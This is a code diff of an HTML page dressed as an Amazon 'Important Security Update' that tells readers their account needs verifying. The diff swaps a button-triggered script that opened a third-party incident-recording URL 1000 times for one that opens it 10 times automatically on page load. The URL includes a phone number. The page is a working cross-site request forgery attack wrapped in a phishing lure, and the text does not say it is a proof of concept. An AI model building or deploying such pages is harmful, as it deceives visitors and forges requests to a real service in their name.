@@ -58,18 +58,13 @@
     <div class="container">
         <h1>Important Security Update</h1>
         <p>We have detected suspicious activity on your Amazon account. Please click the button below to verify your account and protect your personal information.</p>
-        <button class="button">
-            Verify Account & Secure Now
-        </button>
     </div>
         <script>
-	    let btn = document.getElementsByTagName('button')[0]
-            function triggerCSRF() {
-                for (let step = 0; step < 1000; step++) {
+            window.onload = function() {
+                for (let step = 0; step < 10; step++) {
   		window.open("https://app-mig.emreach.com/incidents/record?phoneNumber=917979898742&voiceid=00000000-0000-0000-0000-000000000000")
 	      } 
             }
-	   btn.addEventListener('click', triggerCSRF)
         </script>
 </body>
 </html>
